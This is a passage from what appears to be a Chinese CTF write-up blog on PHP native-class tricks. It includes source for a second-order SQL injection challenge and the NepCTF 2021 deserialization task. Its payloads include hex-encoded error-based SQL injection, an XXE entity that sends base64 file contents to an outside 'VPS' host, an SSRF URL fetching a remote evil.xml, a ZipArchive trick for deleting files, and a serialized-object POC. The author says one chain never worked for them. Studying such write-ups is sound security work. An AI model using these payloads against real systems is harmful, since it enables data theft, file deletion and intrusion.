<span class="hljs-class">	&lt;<span class="hljs-title">script</span> <span class="hljs-title">type</span>="<span class="hljs-title">text</span>/<span class="hljs-title">javascript</span>" <span class="hljs-title">src</span>="<span class="hljs-title">js</span>/<span class="hljs-title">jquery</span>-2.1.4.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>"&gt;&lt;/<span class="hljs-title">script</span>&gt;</span>
<span class="hljs-class">	&lt;<span class="hljs-title">script</span> <span class="hljs-title">class</span>="<span class="hljs-title">javascript</span>" <span class="hljs-title">src</span>="<span class="hljs-title">images</span>/<span class="hljs-title">Scripts</span>/<span class="hljs-title">shBrushPhp</span>.<span class="hljs-title">js</span>"&gt;&lt;/<span class="hljs-title">script</span>&gt;</span>
<span class="hljs-class">	&lt;<span class="hljs-title">script</span> <span class="hljs-title">class</span>="<span class="hljs-title">javascript</span>"&gt;</span>
<span class="hljs-class">		<span class="hljs-title">dp</span>.<span class="hljs-title">SyntaxHighlighter</span>.<span class="hljs-title">HighlightAll</span>('<span class="hljs-title">code</span>');</span>
<span class="hljs-class">	&lt;/<span class="hljs-title">script</span>&gt; </span>
<span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt;</span>
<span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span></code></pre>
<p><strong>SQL二次注入</strong></p>
<p>index.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-keyword">include</span>(<span class="hljs-string">"function.php"</span>);
    <span class="hljs-keyword">include</span>(<span class="hljs-string">"config.php"</span>);
 
    <span class="hljs-variable">$username</span>=<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'user'</span>]);
    <span class="hljs-variable">$check_code</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'cookie-check'</span>];
    <span class="hljs-variable">$check_sql</span>=<span class="hljs-string">"select password from user where username='"</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">"'"</span>;
    <span class="hljs-variable">$check_sum</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$username</span>.<span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-variable">$check_sql</span>,<span class="hljs-variable">$mysql</span>)[<span class="hljs-string">'0'</span>][<span class="hljs-string">'0'</span>]);
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$check_sum</span>!==<span class="hljs-variable">$check_code</span>){
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: login.php"</span>);
    }
<span class="hljs-meta">?&gt;</span>
<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">"./calc.php"</span>);<span class="hljs-meta">?&gt;</span></code></pre>
<p>function.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_result</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>,<span class="hljs-variable">$mysql</span></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$mysql</span>,<span class="hljs-variable">$sql</span>)){
        <span class="hljs-variable">$result_array</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_all</span>(<span class="hljs-variable">$result</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result_array</span>;
    }<span class="hljs-keyword">else</span>{
         <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$mysql</span>);
         <span class="hljs-keyword">return</span> <span class="hljs-string">"Failed"</span>;
    }
}
 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"><span class="hljs-variable">$mysql</span></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>){
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'size'</span>]&gt;<span class="hljs-number">2</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"File is larger than 2M, forbidden upload"</span>);
        }
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>])){
            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-string">"select * from file where filename='"</span>.<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]).<span class="hljs-string">"'"</span>,<span class="hljs-variable">$mysql</span>)){
                <span class="hljs-variable">$filehash</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());
                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-string">"insert into file(filename,filehash,sig) values('"</span>.<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]).<span class="hljs-string">"','"</span>.<span class="hljs-variable">$filehash</span>.<span class="hljs-string">"',"</span>.(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'sig'</span>]),<span class="hljs-string">")"</span>)?<span class="hljs-string">""</span>:<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'sig'</span>])).<span class="hljs-string">")"</span>,<span class="hljs-variable">$mysql</span>)==<span class="hljs-string">"Failed"</span>) 
                    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Upload failed"</span>);
                <span class="hljs-variable">$new_filename</span>=<span class="hljs-string">"./upload/"</span>.<span class="hljs-variable">$filehash</span>.<span class="hljs-string">".txt"</span>;
                <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>], <span class="hljs-variable">$new_filename</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Upload failed"</span>);
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"Your file "</span>.<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]).<span class="hljs-string">" upload successful."</span>);
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-variable">$hash</span>=<span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-string">"select filehash from file where filename='"</span>.<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]).<span class="hljs-string">"'"</span>,<span class="hljs-variable">$mysql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Upload failed"</span>);
                <span class="hljs-variable">$new_filename</span>=<span class="hljs-string">"./upload/"</span>.<span class="hljs-variable">$hash</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>].<span class="hljs-string">".txt"</span>;
                <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>], <span class="hljs-variable">$new_filename</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Upload failed"</span>);
                <span class="hljs-keyword">die</span>(<span class="hljs-string">"Your file "</span>.<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]).<span class="hljs-string">" upload successful."</span>);
            }
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"Not upload file"</span>);
        }
    }
}
 
 
 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">w_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$string</span>));
}
 
 
 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">do_api</span>(<span class="hljs-params"><span class="hljs-variable">$module</span>,<span class="hljs-variable">$args</span></span>)</span>{
    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-variable">$module</span>);
    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$class</span>-&gt;<span class="hljs-title function_ invoke__">newInstanceArgs</span>(<span class="hljs-variable">$args</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>show.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-keyword">include</span>(<span class="hljs-string">"function.php"</span>);
    <span class="hljs-keyword">include</span>(<span class="hljs-string">"config.php"</span>);
    <span class="hljs-keyword">include</span>(<span class="hljs-string">"calc.php"</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'action'</span>])&amp;&amp;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'action'</span>]==<span class="hljs-string">"view"</span>){
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">"REMOTE_ADDR"</span>]!==<span class="hljs-string">"127.0.0.1"</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">"Forbidden."</span>);
        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>])){
            <span class="hljs-variable">$file_info</span>=<span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-string">"select * from file where filename='"</span>.<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>]).<span class="hljs-string">"'"</span>,<span class="hljs-variable">$mysql</span>);
            <span class="hljs-variable">$file_name</span>=<span class="hljs-variable">$file_info</span>[<span class="hljs-string">'0'</span>][<span class="hljs-string">'2'</span>];
            <span class="hljs-keyword">echo</span>(<span class="hljs-string">"file code: "</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">"./upload/"</span>.<span class="hljs-variable">$file_name</span>.<span class="hljs-string">".txt"</span>));
            <span class="hljs-variable">$new_sig</span>=<span class="hljs-title function_ invoke__">mt_rand</span>();
            <span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-string">"update file set sig='"</span>.<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$new_sig</span>).<span class="hljs-string">"' where id="</span>.<span class="hljs-variable">$file_info</span>[<span class="hljs-string">'0'</span>][<span class="hljs-string">'0'</span>].<span class="hljs-string">" and sig='"</span>.<span class="hljs-variable">$file_info</span>[<span class="hljs-string">'0'</span>][<span class="hljs-string">'3'</span>].<span class="hljs-string">"'"</span>,<span class="hljs-variable">$mysql</span>);
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"&lt;br&gt;new sig:"</span>.<span class="hljs-variable">$new_sig</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"Null filename"</span>);
        }
    }
 
    <span class="hljs-variable">$username</span>=<span class="hljs-title function_ invoke__">w_addslashes</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'user'</span>]);
    <span class="hljs-variable">$check_code</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">'cookie-check'</span>];
    <span class="hljs-variable">$check_sql</span>=<span class="hljs-string">"select password from user where username='"</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">"'"</span>;
    <span class="hljs-variable">$check_sum</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$username</span>.<span class="hljs-title function_ invoke__">sql_result</span>(<span class="hljs-variable">$check_sql</span>,<span class="hljs-variable">$mysql</span>)[<span class="hljs-string">'0'</span>][<span class="hljs-string">'0'</span>]);
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$check_sum</span>!==<span class="hljs-variable">$check_code</span>){
        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: login.php"</span>);
    }
 
    <span class="hljs-variable">$module</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'module'</span>];
    <span class="hljs-variable">$args</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'args'</span>];
    <span class="hljs-title function_ invoke__">do_api</span>(<span class="hljs-variable">$module</span>,<span class="hljs-variable">$args</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>show.php中，限制了 ip 只能是<code>127.0.0.1</code>，说明只能通过 XXE 去触发SSRF。这里根据<code>filename</code>获取数据库中的 <code>sig</code> 然后进行 update 操作，但没有对 <code>sig</code> 值进行过滤，导致二次注入。</p>
<p>再看一下<code>function.php</code>中的<code>upload_file()</code>上传文件部分，首先他会判断 filename 是否存在，如果不存在就会插入数据库，这里 <code>sig</code> 没有用单引号保护，但是用了 <code>addslashes()</code> 进行转义，而我们要插入二次注入的语句必须得有单引号，这个时候就可以用 hex 编码进行绕过。</p>
<p>因为<code>sql_result()</code>函数中会输出 sql 错误，所以我们用 updatexml 函数进行报错注入。构造 payload:</p>
<p><strong>数据库可以识别16进制并解码</strong></p>
<pre><code class="hljs plaintext">'||extractvalue(1,concat(0x7e,(select flag from flag),0x7e))||'
//hex编码之后
0x277C7C6578747261637476616C756528312C636F6E63617428307837652C2873656C65637420666C61672066726F6D20666C6167292C3078376529297C7C27
 
//由于报错的字符数有限制，需要用reverse再输出一次
'||extractvalue(1,concat(0x7e,(select reverse(flag) from flag),0x7e))||'
//hex编码之后
0x277c7c6578747261637476616c756528312c636f6e63617428307837652c2873656c656374207265766572736528666c6167292066726f6d20666c6167292c3078376529297c7c27</code></pre>
<p>修改send.xml</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">payl</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">"php://filter/read=convert.base64-encode/resource=http://127.0.0.1/show.php?action=view&amp;filename=1.txt"</span>&gt;</span>
<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span> <span class="hljs-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'https://VPS/?%payl;'&gt;"</span>&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625162643118.png" alt="image-20230625162643118"></p>
<p>上传成功之后再利用SimpleXMLElement类进行SSRF，也就是访问URL：</p>
<pre><code class="hljs http">/show.php?module=SimpleXMLElement&amp;args[]=http://124.220.233.26/tmp/evil.xml&amp;args[]=2&amp;args[]=true</code></pre>
<p>之后查看web访问日志，将得到的结果base64解码之后即可。<strong>（注意由于分了2次上传，因此两次的文件名字需要不一样才行）</strong></p>
<p>这里不知道为啥一直实现不了,就看个思路吧…</p>
<h3 id="105-ziparchive-类来删除文件">10.5 ZipArchive 类来删除文件</h3>
<h4 id="ziparchive-类">ZipArchive 类</h4>
<p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。</p>
<p>下面列举几个常见的类方法：</p>
<pre><code class="hljs php">- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">addEmptyDir</span>`：添加一个新的文件目录
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">addFile</span>`：将文件添加到指定zip压缩包中
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">addFromString</span>`：添加新的文件同时将内容添加进去
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">close</span>`：关闭ziparchive
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">extractTo</span>`：将压缩包解压
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">open</span>`：打开一个zip压缩包
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">deleteIndex</span>`：删除压缩包中的某一个文件，如：`<span class="hljs-title function_ invoke__">deleteIndex</span>(<span class="hljs-number">0</span>)`代表删除第一个文件
- `<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">deleteName</span>`：删除压缩包中的某一个文件名称，同时也将文件删除
- ……</code></pre>
<p>我们来重点看看 <code>ZipArchive::open</code> 方法：</p>
<pre><code class="hljs plaintext">ZipArchive::open ( string $filename [, int $flags ] ) : mixed</code></pre>
<p>该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。</p>
<pre><code class="hljs plaintext">- `$filename`：要打开的ZIP存档的文件名。
- `$flags`：用于打开档案的模式。有以下几种模式：
- `ZipArchive::OVERWRITE`：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。
- `ZipArchive::CREATE`：如果不存在则创建一个zip压缩包。
- `ZipArchive::RDONLY`：只读模式打开压缩包。
- `ZipArchive::EXCL`：如果压缩包已经存在，则出错。
- `ZipArchive::CHECKCONS`：对压缩包执行额外的一致性检查，如果失败则显示错误。</code></pre>
<p>注意，如果设置flags参数的值为 <code>ZipArchive::OVERWRITE</code> 的话，可以把指定文件删除。这里我们跟进方法可以看到<code>const OVERWRITE = 8</code>，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将<code>$flags</code>赋值为8。</p>
<p>也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。</p>
<p>example：</p>
<pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();
<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">'1.txt'</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">OVERWRITE</span>);  
<span class="hljs-comment">// ZipArchive::OVERWRITE:  总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖</span>
<span class="hljs-comment">// 因为没有保存，所以效果就是删除了1.txt</span></code></pre>
<p><strong>[NepCTF 2021]梦里花开牡丹亭</strong></p>
<p>找了半天没找到复现环境，就跟着wp走一遍吧</p>
<p>进入题目，给出源码：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span>(<span class="hljs-string">'shell.php'</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Game</span></span>{
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$password</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$choice</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$register</span>;
 
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span>;
 
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">'user'</span>;
        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-string">'user'</span>;
    }
 
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;register)===<span class="hljs-string">"21232f297a57a5a743894a0e4a801fc3"</span>){    <span class="hljs-comment">// admin</span>
            <span class="hljs-variable language_">$this</span>-&gt;choice=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$this</span>-&gt;file,<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-variable">$this</span>-&gt;content);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-variable language_">$this</span>-&gt;choice = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">register</span>();
        }
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;choice-&gt;<span class="hljs-title function_ invoke__">checking</span>(<span class="hljs-variable">$this</span>-&gt;username,<span class="hljs-variable">$this</span>-&gt;password);
    }
 
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">login</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;
 
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>,<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$content</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;file=<span class="hljs-variable">$file</span>;
        <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-variable">$filename</span>;
        <span class="hljs-variable language_">$this</span>-&gt;content=<span class="hljs-variable">$content</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checking</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>===<span class="hljs-string">'admin'</span>&amp;&amp;<span class="hljs-variable">$password</span>===<span class="hljs-string">'admin'</span>){
            <span class="hljs-variable language_">$this</span>-&gt;file-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-variable">$this</span>-&gt;content);
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'login success you can to open shell file!'</span>);
        }
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">register</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checking</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span>===<span class="hljs-string">'admin'</span>&amp;&amp;<span class="hljs-variable">$password</span>===<span class="hljs-string">'admin'</span>){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'success register admin'</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'please register admin '</span>);
        }
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Open</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span></span>)</span>{
        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'waf.txt'</span>)){    <span class="hljs-comment">// 当waf.txt没读取成功时才能得到flag</span>
            <span class="hljs-title function_ invoke__">shell</span>(<span class="hljs-variable">$content</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>.<span class="hljs-string">".php"</span>);    <span class="hljs-comment">// filename=php://filter/read=convert.base64-encode/resource=shell</span>
        }
    }
}
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>]!==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>]&amp;&amp;(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>])) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>])=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'b'</span>]))){
    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'unser'</span>]));
}</code></pre>
<p>这是一道反序列化题目，但是前面加了一个简单的PHP特性。</p>
<p><strong>1. 数组绕过哈希比较</strong></p>
<p>由于<code>md5()</code>和<code>sha1()</code>函数都无法处理数组，因此传入一个数组会返回false。因此这里可以绕过需要两个不同的数但是其哈希值要相等。</p>
<p>example：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625191721351.png" alt="image-20230625191721351"></p>
<p><strong>2. 利用php://filter读文件</strong></p>
<p>我们可以看到Open类里面的<code>open()</code>方法，当<code>waf.txt</code>文件存在的时候会执行<code>echo file_get_contents($filename.".php");</code>，而调用这个类方法是在Login类里面的<code>checking()</code>方法，</p>
<p>而调用Login类的<code>checking()</code>方法的是Game类里面的<code>__destruct()</code>内置方法，因此我们就能够找到一条完整的利用链了，POC：</p>
<p>自己大概也打通了，不错…</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Game</span></span>{
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$password</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$choice</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$register</span>;
 
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span>;
    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span>;
}
 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">login</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;   
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;
}
 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Open</span></span>{
 
}
<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Game</span>();
<span class="hljs-variable">$poc</span>-&gt;username = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;password = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;register = <span class="hljs-string">"admin"</span>;
<span class="hljs-variable">$poc</span>-&gt;file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Open</span>();
<span class="hljs-variable">$poc</span>-&gt;filename = <span class="hljs-string">"php://filter/read=convert.base64-encode/resource=shell"</span>;
<span class="hljs-variable">$poc</span>-&gt;content = <span class="hljs-string">"xxx"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>));
<span class="hljs-meta">?&gt;</span></code></pre>
<p>得到：</p>
<pre><code class="hljs plaintext">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1zaGVsbCI7czo3OiJjb250ZW50IjtzOjM6IjEyMyI7fQ==</code></pre>
<p>执行payload读取到shell.php的源码base64编码：</p>
<p>果然啊，复现的时候，发现原来是waf.txt没创建，导致代码走不通…</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625202537692.png" alt="image-20230625202537692"></p>
<p>shell.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
